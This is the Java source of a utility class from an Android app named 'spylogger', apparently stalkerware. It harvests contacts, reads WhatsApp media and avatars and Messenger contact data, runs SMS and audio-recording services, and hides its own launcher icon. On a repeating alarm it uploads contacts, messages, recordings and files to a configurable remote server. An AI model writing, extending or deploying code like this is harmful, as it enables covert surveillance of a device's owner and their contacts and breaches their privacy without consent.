package com.gravatasufoca.spylogger.utils;

import android.Manifest;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.os.FileObserver;
import android.provider.BaseColumns;
import android.provider.ContactsContract;
import android.provider.ContactsContract.PhoneLookup;
import android.provider.MediaStore;
import android.provider.Settings.Secure;
import android.util.Base64;
import android.util.Log;
import android.webkit.MimeTypeMap;

import com.google.firebase.iid.FirebaseInstanceId;
import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookContacts;
import com.gravatasufoca.spylogger.helpers.MensageiroAsyncHelper;
import com.gravatasufoca.spylogger.helpers.NetworkUtil;
import com.gravatasufoca.spylogger.helpers.TaskComplete;
import com.gravatasufoca.spylogger.model.Configuracao;
import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.model.TipoAcao;
import com.gravatasufoca.spylogger.model.TipoMidia;
import com.gravatasufoca.spylogger.model.messenger.Contact;
import com.gravatasufoca.spylogger.receivers.Alarm;
import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
import com.gravatasufoca.spylogger.repositorio.RepositorioMensagem;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioMensagemImpl;
import com.gravatasufoca.spylogger.services.FcmHelperService;
import com.gravatasufoca.spylogger.services.MensageiroObserversService;
import com.gravatasufoca.spylogger.services.MessengerService;
import com.gravatasufoca.spylogger.services.RecordService;
import com.gravatasufoca.spylogger.services.SendContatosService;
import com.gravatasufoca.spylogger.services.SendGravacoesService;
import com.gravatasufoca.spylogger.services.SendMensagensService;
import com.gravatasufoca.spylogger.services.SmsService;
import com.gravatasufoca.spylogger.services.WhatsAppService;
import com.gravatasufoca.spylogger.vos.ContatoVO;
import com.gravatasufoca.spylogger.vos.FcmMessageVO;
import com.j256.ormlite.dao.Dao;
import com.utilidades.gravata.utils.Utilidades;

import org.apache.commons.io.FileUtils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FilenameFilter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.sql.SQLException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class Utils {

    public static final String MENSAGEM_RECEBIDA="MENSAGEM_RECEBIDA";
    public static final byte[] SALT = new byte[]{-32, 58, -52, 48, 15, -124, 123, 64, 60, -44, -122, -91, -23, 53, -23, 123, 44, -123, -111, 43};

    public static final String FACEBOOK_DIR_PATH = android.os.Environment.getDataDirectory().toString() + "/data/com.messenger.orca";
    public static final String NOT_PREMIUM = "<div class=\"center\"><div class=\"alert alert-warning section\">%s</div></div>";
    public static final String TOKEN = FirebaseInstanceId.getInstance().getToken();
    public static boolean rooted;

    public static String[] permissoes = {
            Manifest.permission.GET_ACCOUNTS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.PROCESS_OUTGOING_CALLS,
            Manifest.permission.GET_ACCOUNTS,
            Manifest.permission.ACCOUNT_MANAGER,
            Manifest.permission.WAKE_LOCK,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.CAPTURE_AUDIO_OUTPUT,
            Manifest.permission.CAPTURE_VIDEO_OUTPUT,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.BIND_ACCESSIBILITY_SERVICE,
            Manifest.permission.SYSTEM_ALERT_WINDOW

    };

	/*
    <uses-permission android:name="android.permission.READ_PROFILE" />
	<uses-permission android:name="android.permission.ACCESS_SUPERUSER"/>
	<uses-permission android:name="android.permission.USE_CREDENTIALS"/>
	<uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"/>
	*/

    private static ScheduledExecutorService scheduleTaskExecutor;
    public static ScheduledFuture<?> scheduledFuture;
    public static final long MAX_SIZE = 26214400;
    public static Alarm alarm;
    private static PendingIntent pendingIntent;
    public static boolean verificado = false;
    public static boolean licenciado = false;
    public static String PREF = "jabi";
    public static String COMPRADO = "potoca";
    public static String serverURL;

//    public static Context context;
    public static FileObserver observer;

    public static String getDeviceId(ContentResolver contentResolver) {
        String deviceId = Secure.getString(contentResolver, Secure.ANDROID_ID);
        return "_#$A3d12abk%" + deviceId;
    }

    public static boolean isDebugglabe(Context context) {
        //return false;
        return (0 != (context.getApplicationInfo().flags &= ApplicationInfo.FLAG_DEBUGGABLE));
    }


    public static ScheduledExecutorService getScheduleTaskExecutor() {
        if (scheduleTaskExecutor == null)
            scheduleTaskExecutor = Executors.newSingleThreadScheduledExecutor();
        return scheduleTaskExecutor;
    }


    public static boolean isComprado(final Context ctx) {
        if (!isDebugglabe(ctx)) {
            boolean t = ctx.getSharedPreferences(PREF, 0).getBoolean(COMPRADO, false);
            licenciado = t;
            verificado = true;
            return t;
        } else {
            licenciado = true;
            verificado = true;
            ctx.getSharedPreferences(PREF, 0).edit().putBoolean(COMPRADO, false).commit();
            return true;
        }
    }

    public static void copyFile(File source, File dest) throws IOException {
        FileUtils.copyFile(source,dest);
    }

    public static void createFile(File dest, String msg) throws IOException {

        OutputStream output = new FileOutputStream(dest);
        output.write(msg.getBytes());

        // Close the streams
        output.flush();
        output.close();

    }

    public static List<ContatoVO> getContatos(ContentResolver contentResolver) {
        Set<ContatoVO> contatos = new HashSet<>();
        Cursor cur = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));

                        ContatoVO contato = new ContatoVO();
                        contato.setNome(name);
                        contato.setNumero(phoneNo.replaceAll("[^\\d\\+]", ""));
                        contatos.add(contato);
                    }
                    pCur.close();
                }
            }
        }

        return new ArrayList<>(contatos);
    }


    public static Cursor getContact(String number,
                                    ContentResolver contentResolver) {
        Uri uri = Uri.withAppendedPath(
                ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                Uri.encode(number));

        Cursor contactLookup = contentResolver.query(uri, new String[]{
                        BaseColumns._ID, ContactsContract.PhoneLookup.DISPLAY_NAME},
                null, null, null);

        if (contactLookup != null && contactLookup.getCount() > 0) {
            contactLookup.moveToNext();

            return contactLookup;
        }

        return contactLookup;
    }

    public static String getContactDisplayNameByNumber(Cursor contactLookup) {
        try {
            String nome = contactLookup.getString(contactLookup
                    .getColumnIndex(ContactsContract.Data.DISPLAY_NAME));
            return nome;
        } catch (Exception e) {
            return null;
        } finally {
            contactLookup.close();
        }
    }

    public static String getContactDisplayNameByNumber(String number,
                                                       ContentResolver contentResolver) {
        if (number == null || number.isEmpty()) return "";
        int indice = number.indexOf("@");

        Cursor contact = getContact(number.substring(0, indice != -1 ? indice : number.length()), contentResolver);
        String nome = getContactDisplayNameByNumber(contact);
        return nome != null ? nome : number;
    }

    public static Uri getPhotoUri(long contactId,
                                  ContentResolver contentResolver) {

        try {
            Cursor cursor = contentResolver
                    .query(ContactsContract.Data.CONTENT_URI,
                            null,
                            ContactsContract.Data.CONTACT_ID
                                    + "="
                                    + contactId
                                    + " AND "

                                    + ContactsContract.Data.MIMETYPE
                                    + "='"
                                    + ContactsContract.CommonDataKinds.Photo.CONTENT_ITEM_TYPE
                                    + "'", null, null);

            if (cursor != null) {
                if (!cursor.moveToFirst()) {
                    return null; // no photo
                }
            } else {
                return null; // error in cursor process
            }

        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }

        Uri person = ContentUris.withAppendedId(
                ContactsContract.Contacts.CONTENT_URI, contactId);
        return Uri.withAppendedPath(person,
                ContactsContract.Contacts.Photo.CONTENT_DIRECTORY);
    }

    public static String fetchContactId(Cursor cFetch) {

        String contactId = "";

        if (cFetch.moveToFirst()) {
            cFetch.moveToFirst();

            contactId = cFetch
                    .getString(cFetch.getColumnIndex(PhoneLookup._ID));

        }

        return contactId;

    }

    public static String getMimeType(String url) {
        String type = null;
        String extension = MimeTypeMap.getFileExtensionFromUrl(url);
        if (extension != null) {
            type = MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension);
        }
        return type;
    }

    public static void showIcon(boolean show, Context ctx) {
        ComponentName componentToDisable = new ComponentName("com.gravatasufoca.spylogger", "com.gravatasufoca.spylogger.activities.MainActivity");
        PackageManager p = ctx.getPackageManager();
        if (show)
            p.setComponentEnabledSetting(componentToDisable, PackageManager.COMPONENT_ENABLED_STATE_DEFAULT, PackageManager.DONT_KILL_APP);
        else
            p.setComponentEnabledSetting(componentToDisable, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    public static String encodeBase64(byte[] data) {
        return Base64.encodeToString(data, Base64.NO_WRAP);
    }

    public static String encodeBase64(File f) {
        return Base64.encodeToString(getBytesFromFile(f), Base64.NO_WRAP);
    }

    public static File getMediaFile(TipoMidia tipo, long tamanho, Date data, int dias) {
        String path = Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp " + tipo.getTipo();
        final String nome = tipo.getPrefixo() + "-";
        File dir = new File(path);

        final List<String> datas = new ArrayList<String>();

        //adiciona a qtd de dias para frente
        Date ndata = new Date(data.getTime() + dias * 24 * 60 * 60 * 1000);

        datas.add(new SimpleDateFormat("yyyyMMdd").format(ndata));

        for (int i = 1; i <= dias * 2; i++) {

            Date tmp = new Date(ndata.getTime() - i * 24 * 60 * 60 * 1000);

            datas.add(new SimpleDateFormat("yyyyMMdd").format(tmp));


        }

        File[] arquivos = dir.listFiles(new FilenameFilter() {

            @Override
            public boolean accept(File dir, String filename) {

                boolean check = false;

                for (String data : datas) {
                    if (filename.toLowerCase().startsWith(nome + data)) {
                        check = true;
                        break;
                    }
                }

                return check;
            }
        });
        if (arquivos != null) {
            for (File file : arquivos) {
                long t = file.length();
                if (t == tamanho)
                    return file;
            }
        }
        return null;
    }

    public static File getMediaFile2(TipoMidia tipo, final long tamanho, Date data, int dias) {
        String path = Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp " + tipo.getTipo();
        final String nome = tipo.getPrefixo() + "-";
        File dir = new File(path);

        final List<String> datas = new ArrayList<String>();

        //adiciona a qtd de dias para frente
        Date ndata = new Date(data.getTime() + dias * 24 * 60 * 60 * 1000);

        datas.add(new SimpleDateFormat("yyyyMMdd").format(ndata));

        for (int i = 1; i <= dias * 2; i++) {

            Date tmp = new Date(ndata.getTime() - i * 24 * 60 * 60 * 1000);

            datas.add(new SimpleDateFormat("yyyyMMdd").format(tmp));


        }

        File[] arquivos = dir.listFiles(new FilenameFilter() {
            @Override
            public boolean accept(File dir, String filename) {
                return dir.length() == tamanho;
            }
        });

        if (arquivos != null) {
            for (File file : arquivos) {
                for (String data2 : datas) {
                    if (file.getName().toLowerCase().startsWith(nome + data2)) {
                        return file;
                    }
                }

            }
        }
        return null;
    }

    public static String getFilePathFromContentUri(Uri uri,
                                                   ContentResolver contentResolver) {
        String fileName = "unknown";//default fileName
        Uri filePathUri = uri;
        if (uri.getScheme().toString().compareTo("content") == 0) {
            Cursor cursor = contentResolver.query(uri, null, null, null, null);
            if (cursor.moveToFirst()) {
                int column_index = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);//Instead of "MediaStore.Images.Media.DATA" can be used "_data"
                filePathUri = Uri.parse(cursor.getString(column_index));
                fileName = filePathUri.getLastPathSegment().toString();
            }
        } else if (uri.getScheme().compareTo("file") == 0) {
            fileName = filePathUri.getLastPathSegment().toString();
        } else {
            fileName = fileName + "_" + filePathUri.getLastPathSegment();
        }
        return fileName;
    }

    public static byte[] getBytesFromFile(File arquivo) {

        FileInputStream is;
        try {
            is = new FileInputStream(arquivo);
            return getBytesFromInputStream(is);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
            return null;
        }


    }

    public static byte[] getBytesFromInputStream(InputStream is) {
        try {
            ByteArrayOutputStream os = new ByteArrayOutputStream();

            byte[] buffer = new byte[0xFFFF];

            for (int len; (len = is.read(buffer)) != -1; )
                os.write(buffer, 0, len);

            os.flush();

            return os.toByteArray();
        } catch (IOException e) {
            return null;
        }
    }

    public static String getFileExtension(File file) {
        String name = file.getName();
        try {
            return name.substring(name.lastIndexOf(".") + 1);
        } catch (Exception e) {
            return "";
        }
    }

    public static boolean estaNoIntervalo(Date data, int dias) {
        Calendar dia = Calendar.getInstance();

        dia.set(Calendar.HOUR_OF_DAY, 0);
        dia.set(Calendar.MINUTE, 0);
        dia.set(Calendar.SECOND, 0);
        dia.set(Calendar.MILLISECOND, 0);

        dia.add(Calendar.DATE, dias * -1);

        return (data.getTime() >= dia.getTimeInMillis());
    }


    public static byte[] compactar(Map<String, byte[]> anexos) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ZipOutputStream zip = new ZipOutputStream(baos);

        Set<String> keys = anexos.keySet();
        try {
            for (String key : keys) {

                byte[] anexo = anexos.get(key);
                if (anexo != null) {
                    ZipEntry entry = new ZipEntry(key);
                    zip.putNextEntry(entry);
                    zip.write(anexo);
                    zip.closeEntry();
                }
            }

            zip.close();

            return baos.toByteArray();
        } catch (IOException e) {
            return null;
        }
    }

    public static Date zeraHora(Date dt) {
        Calendar data = Calendar.getInstance();
        data.setTime(dt);

        data.set(Calendar.HOUR_OF_DAY, 0);
        data.set(Calendar.MINUTE, 0);
        data.set(Calendar.SECOND, 0);
        data.set(Calendar.MILLISECOND, 0);

        return data.getTime();
    }

    public static File getFotoContato(String contato) {
        try {
            File f = new File(android.os.Environment.getDataDirectory().toString() + "/data/com.whatsapp/files/Avatars/" + contato + ".j");
            if (f.exists())
                return f;
            return null;
        } catch (Exception e) {
            return null;
        }
    }


    public static Contact getContato(Context context,String userKey) throws SQLException {
        Dao<Contact, Integer> dao = (new DatabaseHelperFacebookContacts(context)).getContatosDao();
        String id = "";
        if (userKey.indexOf(":") != -1)
            id = userKey.replaceAll("\\D", "").trim();
        else
            id = userKey;

        Contact tmp = dao.queryBuilder().where().eq("fbid", id).queryForFirst();
        if (tmp != null)
            return tmp;
        else
            return new Contact();
    }

    public static boolean isServiceRunning(Context context) {
        return  Utilidades.isServiceRunning(RecordService.class, context)
                && Utilidades.isServiceRunning(SmsService.class, context);
    }

    public static boolean isDbObserverRunning(Context context){
        return Utilidades.isServiceRunning(MensageiroObserversService.class,context);
    }

    public static String getPercentualMensagem(String mensagem, int percentual) {
        int tamanho = mensagem.length();
        tamanho = (int) (tamanho * (percentual / 100.0));

        return mensagem.substring(0, tamanho);
    }

    public static void startAlarm(final Context context, Configuracao configuracao) {

        if (context != null && configuracao != null) {
            if (alarm != null) {
                alarm.cancelAlarm(context, pendingIntent);
            }
            Utils.alarm = new Alarm();

            pendingIntent=Utils.alarm.setRepeatingAlarm(context, configuracao.getIntervalo(), new TaskComplete() {
                @Override
                public void onFinish(Object object) {
                    Utils.enviarTudo(context);
                }
            });
        }
    }


    // Start the service
    public static void iniciarServicos(Context context, Configuracao configuracao) {
        if (!Utils.isServiceRunning(context)) {
            startServices(context);
        }
        if (rooted) {
            startDbObserver(context);

        }
        startAlarm(context, configuracao);
    }

    public static void primeiroStart(final Context context, Configuracao configuracao) {
        if (!Utils.isServiceRunning(context)) {
            startServices(context);
        }
       if (rooted){
           new MensageiroAsyncHelper(context, new TaskComplete() {
               @Override
               public void onFinish(Object object) {
                   startDbObserver(context);
                   Utils.enviarTudo(context);
               }
           }).execute(new WhatsAppService(context),new MessengerService(context));
       }
       startAlarm(context, configuracao);
    }

    public static void startDbObserver(Context context) {
        context.startService(new Intent(context, MensageiroObserversService.class));
    }

    public static void startServices(Context context) {
        context.startService(new Intent(context, SmsService.class));
        context.startService(new Intent(context, RecordService.class));
    }

    public static void enviarTudo(Context context) {
        try {
            Log.d("spylogger","enviarTudo");
            RepositorioConfiguracao repositorioConfiguracao = new RepositorioConfiguracaoImpl(context);

            Configuracao configuracao = repositorioConfiguracao.getConfiguracao();

            if (configuracao != null) {
                int status = NetworkUtil.getConnectivityStatusString(context);
                if (status != NetworkUtil.NETWORK_STATUS_NOT_CONNECTED) {
                    SendContatosService sendContatosService = new SendContatosService(context, null);
                    sendContatosService.enviarContatos();

                    SendMensagensService sendMensagensService = new SendMensagensService(context, null);
                    sendMensagensService.enviarTopicos();

                    if (configuracao.isWifi()) {
                        Log.d("spylogger","esta no wifi");
                        if (status == NetworkUtil.NETWORK_STATUS_WIFI) {
                            SendGravacoesService sendGravacoesService = new SendGravacoesService(context, null);
                            sendGravacoesService.enviarTopicos();

                            RepositorioMensagem repositorioMensagem = new RepositorioMensagemImpl(context);
                            List<Mensagem> mensagens = repositorioMensagem.listarComArquivoNaoEnviado();

                            FcmMessageVO fcmMessageVO = new FcmMessageVO();
                            fcmMessageVO.setTipoAcao(TipoAcao.REENVIAR_ARQUIVOS);
                            fcmMessageVO.setChave(FirebaseInstanceId.getInstance().getToken());

                            FcmHelperService fcmHelperService = new FcmHelperService(context, fcmMessageVO);
                            fcmHelperService.enviarArquivos(mensagens);
                        }
                    } else {
                        SendGravacoesService sendGravacoesService = new SendGravacoesService(context, null);
                        sendGravacoesService.enviarTopicos();
                    }
                }
            }

        } catch (SQLException e) {
            e.printStackTrace();
        }
    }

    public static String getServerUrl(Context context) {
        try {
            RepositorioConfiguracao repositorioConfiguracao=new RepositorioConfiguracaoImpl(context);
            Configuracao configuracao=repositorioConfiguracao.getConfiguracao();
            if (configuracao != null) {
                String url=configuracao.getServerUrl();
                String pos="/api/v1/";
                if(!url.startsWith("http")){
                    return "http://"+url+pos;
                }
                return url+pos;
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return "";

    }
}
